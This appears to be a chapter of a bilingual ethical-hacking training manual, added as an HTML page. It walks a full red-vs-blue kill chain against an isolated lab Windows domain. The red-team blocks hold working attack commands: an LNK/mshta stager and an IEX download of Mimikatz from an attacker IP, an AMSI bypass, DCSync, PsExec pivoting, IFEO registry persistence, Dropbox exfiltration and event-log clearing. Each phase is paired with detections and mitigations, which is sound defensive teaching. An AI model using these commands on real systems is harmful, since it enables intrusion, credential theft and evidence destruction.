@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 32 — Kill Chain: Um Ataque Completo | Ch. 32</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--fg:#c9d1d9;--fg2:#8b949e;--accent:#39d353;--accent2:#58a6ff;--warn:#d29922;--danger:#f85149;--border:#30363d;--code-bg:#0b0f14;--code-fg:#7ee787}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.65;font-size:16px}
+header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:2px solid var(--accent2);padding:2rem 1.5rem 1.5rem}
+header h1{margin:0 0 .3rem;font-size:1.9rem;color:var(--accent2)}
+header .sub{color:var(--fg2);font-size:.95rem}
+header .meta{margin-top:.8rem;font-size:.85rem;color:var(--fg2)}
+header .meta span{margin-right:1.2rem}
+nav.toc{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:1.5rem auto;max-width:1100px}
+nav.toc h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent2);text-transform:uppercase;letter-spacing:.05em}
+nav.toc ol{margin:0;padding-left:1.3rem;columns:2;column-gap:2rem}
+nav.toc a{color:var(--fg);text-decoration:none}
+nav.toc a:hover{color:var(--accent2)}
+main{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.4rem 1.6rem;margin:1.5rem 0}
+section h2{margin-top:0;color:var(--accent2);font-size:1.3rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}
+section h3{color:var(--accent);font-size:1.05rem;margin-top:1.4rem}
+.lang{display:block;margin:.4rem 0}
+.lang .pt::before{content:"🇵🇹 PT ";color:var(--accent);font-weight:600;font-size:.8rem}
+.lang .en::before{content:"🇬🇧 EN ";color:var(--accent2);font-weight:600;font-size:.8rem}
+.lang .pt,.lang .en{display:block;margin:.25rem 0}
+pre{background:var(--code-bg);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:.88rem;color:var(--code-fg);line-height:1.5}
+code.inline{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:.1rem .4rem;font-family:Consolas,monospace;font-size:.88rem;color:var(--accent)}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.92rem}
+th,td{border:1px solid var(--border);padding:.55rem .7rem;text-align:left;vertical-align:top}
+th{background:var(--bg3);color:var(--accent2)}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.callout{border-left:4px solid var(--warn);background:rgba(210,153,34,.08);padding:.8rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+.callout.danger{border-left-color:var(--danger);background:rgba(248,81,73,.08)}
+.callout.info{border-left-color:var(--accent2);background:rgba(88,166,255,.08)}
+.callout strong{color:var(--fg)}
+.badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.05em;padding:.15rem .5rem;border-radius:999px;margin-left:.4rem;vertical-align:middle}
+.badge.orig{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+.badge.comp{background:rgba(57,211,83,.12);color:var(--accent);border:1px solid var(--accent)}
+.badge.impact{background:rgba(248,81,73,.12);color:var(--danger);border:1px solid var(--danger)}
+.badge.red{background:rgba(248,81,73,.15);color:var(--danger);border:1px solid var(--danger)}
+.badge.blue{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+ul.checklist{list-style:none;padding-left:0}
+ul.checklist li::before{content:"☐ ";color:var(--accent);font-weight:700;margin-right:.3rem}
+footer{border-top:1px solid var(--border);margin-top:3rem;padding:1.5rem;text-align:center;color:var(--fg2);font-size:.85rem}
+footer a{color:var(--accent2);text-decoration:none}
+@media (max-width:720px){nav.toc ol{columns:1}header h1{font-size:1.4rem}}
+</style>
+</head>
+<body>
+<header>
+<h1>Cap. 32 — Kill Chain: Um Ataque Completo</h1>
+<div class="sub">Ch. 32 — End-to-End Integrated Case: Red vs Blue</div>
+<div class="meta"><span>📖 Manual de Formação Ethical Hacker</span><span>🎯 Nível: Integração / Avançado</span></div>
+</header>
+<nav class="toc">
+<h2>Índice / Table of Contents</h2>
+<ol>
+<li><a href="#obj">Objetivos</a></li><li><a href="#scenario">Cenário</a></li>
+<li><a href="#phase1">1. Recon</a></li><li><a href="#phase2">2. Acesso Inicial</a></li>
+<li><a href="#phase3">3. Credenciais</a></li><li><a href="#phase4">4. Movimento Lateral</a></li>
+<li><a href="#phase5">5. Persistência</a></li><li><a href="#phase6">6. Exfiltração</a></li>
+<li><a href="#phase7">7. Anti-Forensics</a></li><li><a href="#phase8">8. Deteção</a></li>
+<li><a href="#timeline">Timeline</a></li><li><a href="#report">Relatório</a></li>
+<li><a href="#mitre">MITRE</a></li><li><a href="#sum">Resumo</a></li>
+</ol>
+</nav>
+<main>
+
+<section id="obj">
+<h2>1. Objetivos do Capítulo / Chapter Objectives</h2>
+<div class="lang">
+<span class="pt">Encadear técnicas de todos os capítulos anteriores num único caso; mostrar Red Team e Blue Team em paralelo; construir uma timeline forense; preencher um relatório de pentest; mapear cada ação a MITRE e a evento de deteção.</span>
+<span class="en">Chain techniques from all previous chapters into a single case; show Red Team and Blue Team in parallel; build a forensic timeline; fill a pentest report; map each action to MITRE and detection event.</span>
+</div>
+</section>
+
+<section id="scenario">
+<h2>2. Cenário / Scenario</h2>
+<div class="lang">
+<span class="pt">A organização <strong>Sekvoya Local</strong> tem um domínio <code class="inline">sekvoya.local</code> com:</span>
+<span class="en"><strong>Sekvoya Local</strong> has a <code class="inline">sekvoya.local</code> domain with:</span>
+</div>
+<table>
+<tr><th>Host</th><th>Função</th><th>IP</th></tr>
+<tr><td>DC01</td><td>Domain Controller (Windows Server)</td><td>10.10.10.10</td></tr>
+<tr><td>WEB01</td><td>IIS Web Server (Windows Server)</td><td>10.10.10.20</td></tr>
+<tr><td>WS01</td><td>Workstation (Windows 10)</td><td>10.10.10.30</td></tr>
+<tr><td>KALI</td><td>Atacante (Kali Linux)</td><td>10.10.10.99</td></tr>
+</table>
+<div class="callout danger">
+<strong>⚠️ Regras / Rules:</strong>
+<div class="lang">
+<span class="pt">Tudo em VMs isoladas (host-only). Snapshot antes de cada fase. Nunca em produção. Credenciais de teste: <code class="inline">svc_web</code> (utilizador), <code class="inline">Domain Admins</code> (objetivo).</span>
+<span class="en">Everything in isolated VMs (host-only). Snapshot before each phase. Never in production. Test credentials: <code class="inline">svc_web</code> (user), <code class="inline">Domain Admins</code> (goal).</span>
+</div>
+</div>
+</section>
+
+<section id="phase1">
+<h2>3. Fase 1 — Recon <span class="badge red">Red</span> <span class="badge blue">Blue</span></h2>
+<h3>3.1 Red Team</h3>
+<pre># Descobrir o domínio
+PS > nltest /dsgetdc:sekvoya.local
+
+# Enumeração de utilizadores com dsquery
+PS > dsquery user
+
+# PowerView: users com SPN (Kerberoastable)
+PS > Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
+
+# PowerView: AS-REP roastable
+PS > Get-DomainUser -KerberosPreauthNotRequired</pre>
+<h3>3.2 Blue Team</h3>
+<table>
+<tr><th>Evento</th><th>O que mostra</th></tr>
+<tr><td>4662</td><td>Acesso a objetos AD (LDAP queries)</td></tr>
+<tr><td>4688</td><td><code class="inline">dsquery.exe</code> / <code class="inline">nltest.exe</code> com argumentos suspeitos</td></tr>
+<tr><td>4104</td><td><code class="inline">Get-DomainUser</code> em Script Block Logging</td></tr>
+</table>
+<div class="lang">
+<span class="pt"><strong>Mitigação:</strong> desativar pre-auth, auditar SPNs, limitar dsquery a admin workstations (Cap. 2, 3, 27).</span>
+<span class="en"><strong>Mitigation:</strong> disable pre-auth, audit SPNs, limit dsquery to admin workstations (Ch. 2, 3, 27).</span>
+</div>
+</section>
+
+<section id="phase2">
+<h2>4. Fase 2 — Acesso Inicial <span class="badge red">Red</span> <span class="badge blue">Blue</span></h2>
+<h3>4.1 Red Team</h3>
+<pre># Criar LNK que executa mshta (a vítima abre)
+$ws = New-Object -ComObject WScript.Shell
+$lnk = $ws.CreateShortcut("C:\Users\Public\Downloads\Proposta.lnk")
+$lnk.TargetPath = "C:\Windows\System32\mshta.exe"
+$lnk.Arguments = "http://10.10.10.99/stager.hta"
+$lnk.Save()
+
+# O HTA executa PowerShell que liga de volta
+# (conteúdo do stager.hta omitido por brevidade)</pre>
+<h3>4.2 Blue Team</h3>
+<table>
+<tr><th>Evento</th><th>O que mostra</th></tr>
+<tr><td>4688</td><td><code class="inline">mshta.exe</code> com URL</td></tr>
+<tr><td>Sysmon 1</td><td>Linhagem <code class="inline">explorer.exe</code> → <code class="inline">mshta.exe</code> → <code class="inline">powershell.exe</code></td></tr>
+<tr><td>Sysmon 3</td><td>Conexão de rede para 10.10.10.99</td></tr>
+</table>
+<div class="lang">
+<span class="pt"><strong>Mitigação:</strong> bloquear <code class="inline">mshta.exe</code> via AppLocker, monitorizar LNK (Cap. 19).</span>
+<span class="en"><strong>Mitigation:</strong> block <code class="inline">mshta.exe</code> via AppLocker, monitor LNK (Ch. 19).</span>
+</div>
+</section>
+
+<section id="phase3">
+<h2>5. Fase 3 — Credenciais <span class="badge red">Red</span> <span class="badge blue">Blue</span></h2>
+<h3>5.1 Red Team</h3>
+<pre># AMSI bypass + Mimikatz
+PS > .\shantanukhande-amsi.ps1
+PS > IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.99/Invoke-Mimikatz.ps1")
+PS > Invoke-Mimikatz -DumpCreds
+
+# DCSync (se Domain Admin)
+PS > .\secretsdump.py sekvoya.local/admin:pass@10.10.10.10 -just-dc-ntlm</pre>
+<h3>5.2 Blue Team</h3>
+<table>
+<tr><th>Evento</th><th>O que mostra</th></tr>
+<tr><td>Sysmon 10</td><td>Acesso a <code class="inline">lsass.exe</code></td></tr>
+<tr><td>4104</td><td><code class="inline">Invoke-Mimikatz</code> em Script Block Logging</td></tr>
+<tr><td>4662</td><td>DCSync (GUID de replicação)</td></tr>
+</table>
+<div class="lang">
+<span class="pt"><strong>Mitigação:</strong> Credential Guard, Protected Users, monitorizar 4104 e 4662 (Cap. 13, 15, 23).</span>
+<span class="en"><strong>Mitigation:</strong> Credential Guard, Protected Users, monitor 4104 and 4662 (Ch. 13, 15, 23).</span>
+</div>
+</section>
+
+<section id="phase4">
+<h2>6. Fase 4 — Movimento Lateral <span class="badge red">Red</span> <span class="badge blue">Blue</span></h2>
+<h3>6.1 Red Team</h3>
+<pre># PsExec para DC01
+PS > psexec.py sekvoya.local/admin:pass@10.10.10.10
+
+# Ou Sliver make-token + psexec pivot
+sliver > make-token -u admin -p pass -d sekvoya.local
+sliver > psexec --service-name Teams target.sekvoya.local</pre>
+<h3>6.2 Blue Team</h3>
+<table>
+<tr><th>Evento</th><th>O que mostra</th></tr>
+<tr><td>7045</td><td>Novo serviço (<code class="inline">PSEXESVC</code> ou nome credível)</td></tr>
+<tr><td>5140/5145</td><td>Acesso a <code class="inline">ADMIN$</code>/<code class="inline">C$</code></td></tr>
+<tr><td>4648</td><td>Logon com credenciais explícitas</td></tr>
+</table>
+<div class="lang">
+<span class="pt"><strong>Mitigação:</strong> desativar SMB onde possível, SMB signing, monitorizar 7045 (Cap. 13, 14).</span>
+<span class="en"><strong>Mitigation:</strong> disable SMB where possible, SMB signing, monitor 7045 (Ch. 13, 14).</span>
+</div>
+</section>
+
+<section id="phase5">
+<h2>7. Fase 5 — Persistência <span class="badge red">Red</span> <span class="badge blue">Blue</span></h2>
+<h3>7.1 Red Team</h3>
+<pre># IFEO Debugger (Cap. 22)
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
+
+# GFLAGS / SilentProcessExit
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\Windows\Temp\payload.exe"</pre>
+<h3>7.2 Blue Team</h3>
+<table>
+<tr><th>Evento</th><th>O que mostra</th></tr>
+<tr><td>Sysmon 12/13</td><td>Criação/alteração de chaves de registo IFEO/SilentProcessExit</td></tr>
+<tr><td>4688</td><td>Processo filho de <code class="inline">notepad.exe</code> com binário em Temp</td></tr>
+</table>
+<div class="lang">
+<span class="pt"><strong>Mitigação:</strong> auditar IFEO, GFLAGS, AppInit (Cap. 22).</span>
+<span class="en"><strong>Mitigation:</strong> audit IFEO, GFLAGS, AppInit (Ch. 22).</span>
+</div>
+</section>
+
+<section id="phase6">
+<h2>8. Fase 6 — Exfiltração <span class="badge red">Red</span> <span class="badge blue">Blue</span></h2>
+<h3>8.1 Red Team</h3>
+<pre># Exfiltração de chaves SSH (Cap. 4)
+PS > $data = Get-Ssh
+PS > [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($data))
+
+# Upload para Dropbox
+PS > "C:\loot\users.csv" | DropBox-Upload</pre>
+<h3>8.2 Blue Team</h3>
+<table>
+<tr><th>Evento</th><th>O que mostra</th></tr>
+<tr><td>Sysmon 3</td><td>Conexão HTTPS para Dropbox</td></tr>
+<tr><td>Sysmon 11</td><td>Criação de ficheiro temporário em <code class="inline">Public\Documents</code></td></tr>
+<tr><td>Egress</td><td>Tráfego de saída para IP não allowlisted</td></tr>
+</table>
+<div class="lang">
+<span class="pt"><strong>Mitigação:</strong> egress filtering, DLP, bloquear Dropbox (Cap. 4).</span>
+<span class="en"><strong>Mitigation:</strong> egress filtering, DLP, block Dropbox (Ch. 4).</span>
+</div>
+</section>
+
+<section id="phase7">
+<h2>9. Fase 7 — Anti-Forensics <span class="badge red">Red</span> <span class="badge blue">Blue</span></h2>
+<h3>9.1 Red Team</h3>
+<pre># Limpeza de logs (Cap. 21)
+PS > Clear-EventLog Security,System,Application
+PS > .\nyx.ps1 -Modules events,history -Force</pre>
+<h3>9.2 Blue Team</h3>
+<table>
+<tr><th>Evento</th><th>O que mostra</th></tr>
+<tr><td>1102</td><td>Security log cleared</td></tr>
+<tr><td>104</td><td>System log cleared</td></tr>
+<tr><td>Prefetch</td><td>Contagem anormalmente baixa</td></tr>
+</table>
+<div class="lang">
+<span class="pt"><strong>Mitigação:</strong> centralizar logs no SIEM, alertar sobre 1102/104 (Cap. 21).</span>
+<span class="en"><strong>Mitigation:</strong> centralize logs in SIEM, alert on 1102/104 (Ch. 21).</span>
+</div>
+</section>
+
+<section id="phase8">
+<h2>10. Fase 8 — Deteção (Blue Team) <span class="badge blue">Blue</span></h2>
+<div class="lang">
+<span class="pt">Após o ataque, o blue team reconstrói o incidente com as ferramentas dos capítulos DFIR.</span>
+<span class="en">After the attack, the blue team reconstructs the incident with DFIR tools from previous chapters.</span>
+</div>
+<pre># DeepBlueCLI (Cap. 6)
+.\DeepBlue.ps1 -log security
+
+# PersistenceSniper (Cap. 6)
+Find-AllPersistence -Verbose
+
+# Live-Forensicator (Cap. 7)
+.\Forensicator.ps1 -EVTX EVTX -BROWSER BROWSER
+
+# Nyx integrity check (Cap. 18)
+.\integrity-check.ps1</pre>
+</section>
+
+<section id="timeline">
+<h2>11. Timeline Forense / Forensic Timeline</h2>
+<table>
+<tr><th>Hora</th><th>Fase</th><th>Artefacto</th><th>Evento</th></tr>
+<tr><td>T0</td><td>Recon</td><td>DC01</td><td>4662, 4688 (dsquery)</td></tr>
+<tr><td>T1</td><td>Acesso</td><td>WS01</td><td>4688 (mshta), Sysmon 1</td></tr>
+<tr><td>T2</td><td>Credenciais</td><td>WS01</td><td>Sysmon 10, 4104</td></tr>
+<tr><td>T3</td><td>Movimento</td><td>DC01</td><td>7045, 5140, 4648</td></tr>
+<tr><td>T4</td><td>Persistência</td><td>DC01</td><td>Sysmon 12/13</td></tr>
+<tr><td>T5</td><td>Exfiltração</td><td>WS01</td><td>Sysmon 3, 11</td></tr>
+<tr><td>T6</td><td>Anti-Forensics</td><td>DC01</td><td>1102, 104</td></tr>
+<tr><td>T7</td><td>Deteção</td><td>SIEM</td><td>Correlação</td></tr>
+</table>
+</section>
+
+<section id="report">
+<h2>12. Relatório de Pentest (Template)</h2>
+<div class="lang">
+<span class="pt">Preenche o template com os achados do caso.</span>
+<span class="en">Fill the template with the case findings.</span>
+</div>
+<pre># Relatório de Pentest — Sekvoya Local
+## Resumo Executivo
+- Acesso inicial via LNK/HTA (T1204.002, T1218.005)
+- Credenciais extraídas via Mimikatz (T1003.001)
+- Movimento lateral para DC01 via PsExec (T1021.002)
+- Persistência via IFEO (T1546.012)
+- Exfiltração de chaves SSH (T1552.004)
+- Anti-forensics via Nyx (T1070.001)
+
+## Achados por Severidade
+| Severidade | Achado | MITRE | Mitigação |
+|------------|--------|-------|-----------|
+| CRITICAL | DCSync possível | T1003.006 | Restringir DA, Protected Users |
+| HIGH | Persistência IFEO | T1546.012 | Auditar IFEO |
+| HIGH | Exfiltração SSH | T1552.004 | Proteger .ssh, egress |
+| MEDIUM | HTA execution | T1218.005 | Bloquear mshta |
+
+## Recomendações
+1. Ativar Credential Guard
+2. Bloquear mshta.exe via AppLocker
+3. Centralizar logs no SIEM
+4. Auditar IFEO/GFLAGS regularmente</pre>
+</section>
+
+<section id="mitre">
+<h2>13. Mapeamento MITRE Consolidado do Caso</h2>
+<table>
+<tr><th>Fase</th><th>Técnica</th><th>ID</th><th>Deteção</th></tr>
+<tr><td>Recon</td><td>Account Discovery: Domain Account</td><td>T1087.002</td><td>4662, 4688</td></tr>
+<tr><td>Acesso</td><td>System Binary Proxy Execution: Mshta</td><td>T1218.005</td><td>4688, Sysmon 1</td></tr>
+<tr><td>Credenciais</td><td>OS Credential Dumping: LSASS Memory</td><td>T1003.001</td><td>Sysmon 10, 4104</td></tr>
+<tr><td>Movimento</td><td>Remote Services: SMB/Windows Admin Shares</td><td>T1021.002</td><td>7045, 5140</td></tr>
+<tr><td>Persistência</td><td>Event Triggered Execution: IFEO Injection</td><td>T1546.012</td><td>Sysmon 12/13</td></tr>
+<tr><td>Exfiltração</td><td>Exfiltration Over C2 Channel</td><td>T1041</td><td>Sysmon 3, 11</td></tr>
+<tr><td>Anti-Forensics</td><td>Indicator Removal: Clear Windows Event Logs</td><td>T1070.001</td><td>1102, 104</td></tr>
+</table>
+</section>
+
+<section id="sum">
+<h2>14. Resumo do Capítulo / Chapter Summary</h2>
+<div class="lang">
+<span class="pt">Este capítulo encadeou técnicas de todos os capítulos anteriores num único caso: recon (dsquery/PowerView), acesso inicial (LNK/HTA), credenciais (Mimikatz/DCSync), movimento lateral (PsExec/Sliver), persistência (IFEO/GFLAGS), exfiltração (SSH/Dropbox), anti-forensics (Nyx) e deteção (DeepBlueCLI, PersistenceSniper, Live-Forensicator). O valor está na <strong>visão integrada</strong>: cada ação Red tem uma deteção Blue correspondente, e a timeline permite reconstruir o incidente. O Cap. 33 entra no Wireless/WPA3.</span>
+<span class="en">This chapter chained techniques from all previous chapters into a single case: recon (dsquery/PowerView), initial access (LNK/HTA), credentials (Mimikatz/DCSync), lateral movement (PsExec/Sliver), persistence (IFEO/GFLAGS), exfiltration (SSH/Dropbox), anti-forensics (Nyx), and detection (DeepBlueCLI, PersistenceSniper, Live-Forensicator). The value is in the <strong>integrated view</strong>: each Red action has a corresponding Blue detection, and the timeline allows reconstructing the incident. Ch. 33 moves into Wireless/WPA3.</span>
+</div>
+</section>
+
+</main>
+<footer>
+<div>Manual de Formação Ethical Hacker — Cap. 32 / Ethical Hacker Training Manual — Ch. 32</div>
+<div style="margin-top:.6rem">
+<a href="cap31.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+<a href="#">Índice / Index</a> &nbsp;|&nbsp;
+<a href="cap33.html">Cap. seguinte / Next →</a>
+</div>
+</footer>
+</body>
+</html>
